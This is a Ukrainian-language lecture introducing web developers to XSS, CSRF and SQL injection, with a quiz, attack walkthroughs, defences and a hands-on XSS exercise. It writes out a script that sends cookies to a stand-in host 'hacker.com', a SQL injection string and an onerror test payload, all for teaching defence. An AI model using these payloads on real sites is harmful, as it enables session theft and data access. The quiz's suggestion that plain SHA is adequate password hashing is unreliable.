# –õ–µ–∫—Ü—ñ—è 8: –¢–µ–º–Ω–∞ —Å—Ç–æ—Ä–æ–Ω–∞ –í–µ–±—É. XSS, CSRF —Ç–∞ SQL Injection

## ‚ö° –ï–∫—Å–ø—Ä–µ—Å-–æ–ø–∏—Ç—É–≤–∞–Ω–Ω—è: –ß–∏ –∑–ª–∞–º–∞—é—Ç—å –≤–∞—Å?

1.  –í–∏ –¥–æ–∑–≤–æ–ª–∏–ª–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—É –≤–≤–æ–¥–∏—Ç–∏ —Å–≤–æ—î —ñ–º'—è, —ñ –≤—ñ–Ω –≤–≤—ñ–≤ `<b>–ë–æ–≥</b>`. –¢–µ–ø–µ—Ä –π–æ–≥–æ —ñ–º'—è –Ω–∞ —Å–∞–π—Ç—ñ –∂–∏—Ä–Ω–µ. –¶–µ –ø—Ä–æ–±–ª–µ–º–∞?
2.  –í–∏ –∑–±–µ—Ä—ñ–≥–∞—î—Ç–µ –ø–∞—Ä–æ–ª—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ —É –±–∞–∑—ñ –¥–∞–Ω–∏—Ö. –©–æ —Å—Ç–∞–Ω–µ—Ç—å—Å—è, —è–∫—â–æ —Ö–∞–∫–µ—Ä –≤–∫—Ä–∞–¥–µ –±–∞–∑—É?
3.  –í–∏ –∑–∞–ª–æ–≥—ñ–Ω–µ–Ω—ñ –≤ –±–∞–Ω–∫—É. –í–∏ –∫–ª—ñ–∫–Ω—É–ª–∏ –Ω–∞ –ø–æ—Å–∏–ª–∞–Ω–Ω—è –≤ –¥–∏–≤–Ω–æ–º—É –ª–∏—Å—Ç—ñ. –ß–∏ –º–æ–∂—É—Ç—å –∑ –≤–∞—à–æ–≥–æ —Ä–∞—Ö—É–Ω–∫—É –∑–Ω–∏–∫–Ω—É—Ç–∏ –≥—Ä–æ—à—ñ?

<details markdown="1">
<summary>–í—ñ–¥–ø–æ–≤—ñ–¥—ñ (–°—Ç—Ä–∞—à–Ω–∞ –ø—Ä–∞–≤–¥–∞)</summary>

1.  **–¢–∞–∫, —Ü–µ XSS.** –Ø–∫—â–æ –≤—ñ–Ω –∑–º–æ–∂–µ –∑—Ä–æ–±–∏—Ç–∏ —Ç–µ–∫—Å—Ç –∂–∏—Ä–Ω–∏–º, –≤—ñ–Ω –∑–º–æ–∂–µ –≤—Å—Ç–∞–≤–∏—Ç–∏ `<script>` —ñ –≤–∫—Ä–∞—Å—Ç–∏ cookies –≤—Å—ñ—Ö, —Ö—Ç–æ –∑–∞–π–¥–µ –Ω–∞ –π–æ–≥–æ –ø—Ä–æ—Ñ—ñ–ª—å.
2.  **–ó–∞–ª–µ–∂–∏—Ç—å –≤—ñ–¥ —Ö–µ—à—É–≤–∞–Ω–Ω—è.** –Ø–∫—â–æ –ø–∞—Ä–æ–ª—ñ –≤—ñ–¥–∫—Ä–∏—Ç–∏–º —Ç–µ–∫—Å—Ç–æ–º ‚Äî –∫—ñ–Ω–µ—Ü—å. –Ø–∫—â–æ —Ö–µ—à–æ–≤–∞–Ω—ñ (SHA/Argon2) ‚Äî —É —Ö–∞–∫–µ—Ä–∞ –±—É–¥–µ –ª–∏—à–µ –Ω–∞–±—ñ—Ä —Å–∏–º–≤–æ–ª—ñ–≤ .
3.  **–¢–∞–∫, —Ü–µ CSRF.** –ë—Ä–∞—É–∑–µ—Ä –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ –≤—ñ–¥–ø—Ä–∞–≤–ª—è—î –≤–∞—à—ñ cookies –±–∞–Ω–∫—É, –Ω–∞–≤—ñ—Ç—å —è–∫—â–æ –∑–∞–ø–∏—Ç —ñ–¥–µ –∑ —Å–∞–π—Ç—É –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞ .

</details>

---

## 1. XSS (Cross-Site Scripting)

–¶–µ –∫–æ–ª–∏ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –≤–ø—Ä–æ–≤–∞–¥–∂—É—î —Å–≤—ñ–π JavaScript –Ω–∞ –≤–∞—à—É —Å—Ç–æ—Ä—ñ–Ω–∫—É .

**–°—Ü–µ–Ω–∞—Ä—ñ–π –∞—Ç–∞–∫–∏:**
1.  –•–∞–∫–µ—Ä –ø–∏—à–µ –≤ –∫–æ–º–µ–Ω—Ç–∞—Ä—ñ: `<script>fetch('http://hacker.com?cookie=' + document.cookie)</script>`.
2.  –°–µ—Ä–≤–µ—Ä –∑–±–µ—Ä—ñ–≥–∞—î —Ü–µ.
3.  –í–∏ –∑–∞—Ö–æ–¥–∏—Ç–µ –ø–æ—á–∏—Ç–∞—Ç–∏ –∫–æ–º–µ–Ω—Ç–∞—Ä—ñ.
4.  –í–∞—à –±—Ä–∞—É–∑–µ—Ä –≤–∏–∫–æ–Ω—É—î —Å–∫—Ä–∏–ø—Ç.
5.  –í–∞—à–∞ —Å–µ—Å—ñ—è –ª–µ—Ç–∏—Ç—å —Ö–∞–∫–µ—Ä—É.

**–ó–∞—Ö–∏—Å—Ç:**
* **Sanitization:** –û—á–∏—â–µ–Ω–Ω—è –≤—Ö—ñ–¥–Ω–∏—Ö –¥–∞–Ω–∏—Ö (–≤–∏–¥–∞–ª–µ–Ω–Ω—è —Ç–µ–≥—ñ–≤ `<script>`, `onload` —Ç–æ—â–æ) .
* **Content Security Policy (CSP):** –ó–∞–±–æ—Ä–æ–Ω–∞ –∑–∞–≤–∞–Ω—Ç–∞–∂—É–≤–∞—Ç–∏ —Å–∫—Ä–∏–ø—Ç–∏ –∑ –ª—ñ–≤–∏—Ö –¥–æ–º–µ–Ω—ñ–≤.
* **Escaping:** –ü–µ—Ä–µ—Ç–≤–æ—Ä–µ–Ω–Ω—è `<` –Ω–∞ `&lt;`. –°—É—á–∞—Å–Ω—ñ —Ñ—Ä–µ–π–º–≤–æ—Ä–∫–∏ (React, Vue) —Ä–æ–±–ª—è—Ç—å —Ü–µ –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ.

---

## 2. CSRF (Cross-Site Request Forgery)

–ê—Ç–∞–∫–∞ "–ø—ñ–¥—Ä–æ–±–ª–µ–Ω–æ–≥–æ –∑–∞–ø–∏—Ç—É" .

**–°—Ü–µ–Ω–∞—Ä—ñ–π:**
1.  –í–∏ –∑–∞–ª–æ–≥—ñ–Ω–µ–Ω—ñ –Ω–∞ —Å–∞–π—Ç—ñ `bank.com`.
2.  –•–∞–∫–µ—Ä —Å—Ç–≤–æ—Ä—é—î —Å–∞–π—Ç `free-iphone.com`.
3.  –ù–∞ —Ü—å–æ–º—É —Å–∞–π—Ç—ñ —î –ø—Ä–∏—Ö–æ–≤–∞–Ω–∞ —Ñ–æ—Ä–º–∞, —è–∫–∞ –≤—ñ–¥–ø—Ä–∞–≤–ª—è—î POST –∑–∞–ø–∏—Ç –Ω–∞ `bank.com/transfer?to=hacker&amount=1000`.
4.  –ö–æ–ª–∏ –≤–∏ –∑–∞—Ö–æ–¥–∏—Ç–µ –Ω–∞ —Å–∞–π—Ç —Ö–∞–∫–µ—Ä–∞, —Ñ–æ—Ä–º–∞ –≤—ñ–¥–ø—Ä–∞–≤–ª—è—î—Ç—å—Å—è.
5.  –ë—Ä–∞—É–∑–µ—Ä –¥–æ–¥–∞—î –≤–∞—à—ñ –∫—É–∫–∏ –≤—ñ–¥ `bank.com`. –ë–∞–Ω–∫ –¥—É–º–∞—î, —â–æ —Ü–µ –≤–∏ –∑—Ä–æ–±–∏–ª–∏ –ø–µ—Ä–µ–∫–∞–∑.

**–ó–∞—Ö–∏—Å—Ç:**
* **CSRF Tokens:** –°–µ–∫—Ä–µ—Ç–Ω–∏–π –∫–æ–¥ —É –∫–æ–∂–Ω—ñ–π —Ñ–æ—Ä–º—ñ, —è–∫–∏–π –∑–Ω–∞—î —Ç—ñ–ª—å–∫–∏ –≤–∞—à —Å–µ—Ä–≤–µ—Ä —ñ –≤–∞—à —Ä–µ–∞–ª—å–Ω–∏–π —Ñ—Ä–æ–Ω—Ç–µ–Ω–¥. –°–∞–π—Ç —Ö–∞–∫–µ—Ä–∞ —Ü–µ–π –∫–æ–¥ –Ω–µ –∑–Ω–∞—î.

---

## 3. SQL Injection

–¶–µ –∫–ª–∞—Å–∏–∫–∞ –±–µ–∫–µ–Ω–¥—É . –í–≤–µ–¥–µ–Ω–Ω—è SQL-–∫–æ–¥—É –∑–∞–º—ñ—Å—Ç—å –¥–∞–Ω–∏—Ö.

**–ö–æ–¥ —Å–µ—Ä–≤–µ—Ä–∞:**
`SELECT * FROM users WHERE name = '` + **userName** + `';`

**–í–≤–µ–¥–µ–Ω–Ω—è —Ö–∞–∫–µ—Ä–∞:**
`' OR '1'='1`

**–†–µ–∑—É–ª—å—Ç–∞—Ç –∑–∞–ø–∏—Ç—É:**
`SELECT * FROM users WHERE name = '' OR '1'='1';`
–¶–µ –ø–æ–≤–µ—Ä–Ω–µ **–í–°–Ü–•** –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤, –±–æ `1=1` –∑–∞–≤–∂–¥–∏ —ñ—Å—Ç–∏–Ω–∞.

**–ó–∞—Ö–∏—Å—Ç:**
* –ù—ñ–∫–æ–ª–∏ –Ω–µ —Å–∫–ª–µ—é–≤–∞—Ç–∏ —Ä—è–¥–∫–∏ –¥–ª—è –∑–∞–ø–∏—Ç—ñ–≤.
* –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ **Prepared Statements** (–ø–∞—Ä–∞–º–µ—Ç—Ä–∏–∑–æ–≤–∞–Ω—ñ –∑–∞–ø–∏—Ç–∏).

---

## üõ† –ü—Ä–∞–∫—Ç–∏–∫—É–º: "–ï—Ç–∏—á–Ω–∏–π –•–∞–∫—ñ–Ω–≥"

–ú–∏ —Å–ø—Ä–æ–±—É—î–º–æ –∑–ª–∞–º–∞—Ç–∏ –Ω–∞—à—É –≤–ª–∞—Å–Ω—É –≥—Ä—É "–ö–∞–º—ñ–Ω—å-–ù–æ–∂–∏—Ü—ñ-–ü–∞–ø—ñ—Ä".

1.  –ó–∞–ø—É—Å—Ç—ñ—Ç—å –≤–µ—Ä—Å—ñ—é –≥—Ä–∏ –±–µ–∑ –∑–∞—Ö–∏—Å—Ç—É (–∑ –í–æ—Ä–∫—à–æ–ø—É 5 –∞–±–æ 6).
2.  –í–≤–µ–¥—ñ—Ç—å —è–∫ —ñ–º'—è –≥—Ä–∞–≤—Ü—è: `<img src=x onerror=alert('PWNED')>`.
3.  –Ø–∫—â–æ –≤–∏ –ø–æ–±–∞—á–∏–ª–∏ `alert`, –≤—ñ—Ç–∞—é ‚Äî —É –≤–∞—Å XSS –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å.
4.  **–í–∏–ø—Ä–∞–≤–ª–µ–Ω–Ω—è:** –ó–∞–º—ñ—Å—Ç—å `innerHTML` –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ `innerText` –∞–±–æ `textContent` –ø—Ä–∏ –≤–∏–≤–æ–¥—ñ —ñ–º–µ–Ω—ñ. –¶–µ –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ –µ–∫—Ä–∞–Ω—É—î —Ç–µ–≥–∏.

## üè† –î–æ–º–∞—à–Ω—î –∑–∞–≤–¥–∞–Ω–Ω—è

–í–∏–∫–æ–Ω–∞–π—Ç–µ **Workshop 6 (Auth & Security)**. –†–µ–∞–ª—ñ–∑—É–π—Ç–µ —Ö–µ—à—É–≤–∞–Ω–Ω—è –ø–∞—Ä–æ–ª—ñ–≤, —â–æ–± –∑–∞—Ö–∏—Å—Ç–∏—Ç–∏—Å—è –≤—ñ–¥ –≤–∏—Ç–æ–∫—É –ª–æ–∫–∞–ª—å–Ω–æ—ó –±–∞–∑–∏ –¥–∞–Ω–∏—Ö.